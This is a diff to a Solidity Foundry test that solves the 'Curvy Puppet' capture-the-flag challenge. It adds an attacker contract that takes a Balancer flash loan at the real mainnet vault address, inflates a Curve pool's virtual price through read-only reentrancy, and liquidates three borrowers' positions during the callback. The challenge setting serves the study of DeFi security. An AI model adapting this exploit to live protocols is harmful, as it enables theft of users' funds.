@@ -158,7 +158,47 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY: Read-only reentrancy in Curve stETH/ETH pool
+         * 
+         * The get_virtual_price() function can be manipulated during the
+         * callback when removing liquidity. When remove_liquidity is called,
+         * the pool first updates internal balances, then sends ETH. During the
+         * ETH send callback, get_virtual_price() returns an inflated value
+         * because LP tokens are burned but balances haven't been updated yet.
+         * 
+         * Attack:
+         * 1. Get WETH and LP tokens from treasury
+         * 2. Add ETH liquidity to get more LP tokens
+         * 3. Call remove_liquidity to trigger the reentrancy
+         * 4. In the receive() callback, liquidate all positions (virtual_price is inflated)
+         * 5. Return remaining assets to treasury
+         */
         
+        // Deploy attacker contract
+        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
+            lending,
+            curvePool,
+            weth,
+            stETH,
+            IERC20(curvePool.lp_token()),
+            IERC20(address(dvt)),
+            permit2,
+            treasury,
+            alice,
+            bob,
+            charlie
+        );
+        
+        // Transfer treasury's assets to attacker
+        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE);
+        
+        // Execute the attack
+        attacker.attack();
+        
+        // Transfer rescued assets back to treasury
+        attacker.cleanup();
     }
 
     /**
@@ -182,5 +222,156 @@ contract CurvyPuppetChallenge is Test {
         assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
         assertEq(weth.balanceOf(player), 0, "Player still has WETH");
         assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
+    }
+}
+
+// Interface for Balancer flash loans (free!)
+interface IBalancerVault {
+    function flashLoan(
+        address recipient,
+        address[] calldata tokens,
+        uint256[] calldata amounts,
+        bytes calldata userData
+    ) external;
+}
+
+contract CurvyPuppetAttacker {
+    CurvyPuppetLending public immutable lending;
+    IStableSwap public immutable curvePool;
+    WETH public immutable weth;
+    IERC20 public immutable stETH;
+    IERC20 public immutable lpToken;
+    IERC20 public immutable dvt;
+    IPermit2 public immutable permit2;
+    address public immutable treasury;
+    address public immutable alice;
+    address public immutable bob;
+    address public immutable charlie;
+    
+    // Balancer Vault on mainnet (fee-free flash loans)
+    IBalancerVault constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    
+    bool private attacking;
+    
+    constructor(
+        CurvyPuppetLending _lending,
+        IStableSwap _curvePool,
+        WETH _weth,
+        IERC20 _stETH,
+        IERC20 _lpToken,
+        IERC20 _dvt,
+        IPermit2 _permit2,
+        address _treasury,
+        address _alice,
+        address _bob,
+        address _charlie
+    ) {
+        lending = _lending;
+        curvePool = _curvePool;
+        weth = _weth;
+        stETH = _stETH;
+        lpToken = _lpToken;
+        dvt = _dvt;
+        permit2 = _permit2;
+        treasury = _treasury;
+        alice = _alice;
+        bob = _bob;
+        charlie = _charlie;
+    }
+    
+    function attack() external {
+        // Setup permit2 for liquidation first
+        lpToken.approve(address(permit2), type(uint256).max);
+        permit2.approve({
+            token: address(lpToken),
+            spender: address(lending),
+            amount: uint160(10e18),
+            expiration: uint48(block.timestamp + 1)
+        });
+        
+        // Flash loan WETH from Balancer (fee-free)
+        // Balancer vault has ~38k WETH, so we'll use 30k
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(weth);
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 30000e18; // 30k WETH
+        
+        balancerVault.flashLoan(address(this), tokens, amounts, "");
+    }
+    
+    // Balancer flash loan callback
+    function receiveFlashLoan(
+        address[] calldata tokens,
+        uint256[] calldata amounts,
+        uint256[] calldata feeAmounts,
+        bytes calldata userData
+    ) external {
+        require(msg.sender == address(balancerVault), "Invalid caller");
+        
+        // Step 1: Unwrap all WETH to ETH
+        uint256 wethBalance = weth.balanceOf(address(this));
+        weth.withdraw(wethBalance);
+        
+        // Step 2: Add massive ETH liquidity to Curve pool to get LP tokens
+        uint256 ethToAdd = address(this).balance;
+        uint256[2] memory addAmounts = [ethToAdd, uint256(0)];
+        curvePool.add_liquidity{value: ethToAdd}(addAmounts, 0);
+        
+        // Step 3: Remove liquidity using remove_liquidity_one_coin (ETH only)
+        // This is where the reentrancy happens - during the ETH send, virtual_price is inflated
+        attacking = true;
+        uint256 lpBalance = lpToken.balanceOf(address(this));
+        // Keep enough LP for liquidations (3 LP tokens needed)
+        uint256 lpToRemove = lpBalance - 3e18;
+        curvePool.remove_liquidity_one_coin(lpToRemove, 0, 0); // Remove as ETH (coin 0)
+        attacking = false;
+        
+        // Step 4: Wrap ETH back to WETH to repay flash loan
+        uint256 ethBalance = address(this).balance;
+        weth.deposit{value: ethBalance}();
+        
+        // Repay flash loan (no fee for Balancer)
+        weth.transfer(address(balancerVault), amounts[0]);
+    }
+    
+    receive() external payable {
+        // Only execute during the attack
+        if (!attacking) return;
+        
+        // At this point, virtual_price should be inflated due to reentrancy
+        // The pool's D is calculated with pre-removal balances but LP supply is reduced
+        lending.liquidate(alice);
+        lending.liquidate(bob);
+        lending.liquidate(charlie);
+    }
+    
+    function cleanup() external {
+        // Transfer all DVT to treasury
+        uint256 dvtBalance = dvt.balanceOf(address(this));
+        if (dvtBalance > 0) {
+            dvt.transfer(treasury, dvtBalance);
+        }
+        
+        // Transfer remaining WETH to treasury
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            weth.deposit{value: ethBalance}();
+        }
+        uint256 wethBalance = weth.balanceOf(address(this));
+        if (wethBalance > 0) {
+            weth.transfer(treasury, wethBalance);
+        }
+        
+        // Transfer remaining LP tokens to treasury
+        uint256 lpBalance = lpToken.balanceOf(address(this));
+        if (lpBalance > 0) {
+            lpToken.transfer(treasury, lpBalance);
+        }
+        
+        // Transfer any stETH to treasury
+        uint256 stEthBalance = stETH.balanceOf(address(this));
+        if (stEthBalance > 0) {
+            stETH.transfer(treasury, stEthBalance);
+        }
     }
 }
